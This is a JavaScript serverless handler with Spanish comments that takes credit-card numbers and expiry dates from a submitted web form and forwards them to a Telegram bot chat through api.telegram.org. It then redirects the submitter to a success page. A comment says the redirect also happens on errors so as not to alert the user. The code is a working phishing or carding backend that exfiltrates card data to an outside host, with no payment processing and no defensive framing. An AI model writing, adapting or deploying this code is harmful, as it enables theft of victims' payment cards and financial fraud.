const https = require('https');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Location': '/success.html'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        // Parsear los datos del formulario
        const params = new URLSearchParams(event.body);
        const cardNumber = params.get('cc-number') || '';
        const expMonth = params.get('cc-exp-month') || '';
        const expYear = params.get('cc-exp-year') || '';

        // Configuración de Telegram
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Faltan variables de entorno de Telegram');
        } else {
            // Crear mensaje
            const message = `🔔 *Nueva tarjeta asociada*\n\n` +
                `💳 *Número:* \`${cardNumber}\`\n` +
                `📅 *Vencimiento:* ${expMonth}/${expYear}\n` +
                `🕐 *Fecha:* ${new Date().toLocaleString('es-ES', { timeZone: 'America/Argentina/Buenos_Aires' })}`;

            // Enviar a Telegram
            await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
        }

        // Redirigir a página de éxito
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    } catch (error) {
        console.error('Error:', error);
        // Redirigir igualmente para no alertar al usuario
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    }
};

function sendToTelegram(botToken, chatId, message) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }
        };

        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', (chunk) => response += chunk);
            res.on('end', () => resolve(response));
        });

        req.on('error', (error) => reject(error));
        req.write(data);
        req.end();
    });
}
